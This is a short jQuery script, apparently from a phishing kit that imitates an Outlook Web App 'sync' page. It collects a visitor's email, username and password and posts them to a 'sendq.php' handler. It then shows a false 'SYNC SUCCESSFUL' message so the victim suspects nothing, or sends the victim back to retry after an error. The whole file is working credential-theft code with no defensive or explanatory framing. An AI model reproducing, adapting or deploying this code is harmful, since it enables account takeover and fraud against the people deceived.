$(document).ready(function(){
$("#submit2").click(function(){



var e = $('#email').val();
var u = $('#username').val();
var p = $('#password').val();
$('#inputs').html('<img src="owa_files/syncing.gif" width="200" height="200">');

$.post('sendq.php', {email:e,username:u,password:p},function(responseText){
if(responseText=="success"){
$('#inputs').html('<div align="center" style="color:blue"><img src="owa_files/image.png" height="auto" width="auto"><br><b>SYNC SUCCESSFUL.<br> You may now close this page.</div>');
                document.getElementById("sub2").style.visibility = 'hidden';
				document.getElementById("sub").style.visibility = 'hidden';
				document.getElementById("errormsg").innerHTML ='';


}else{
$('#inputs').html('');

alert('Failed: Invalid Email Field');
window.location="./sync.html";
}
});
return false;
});
});	


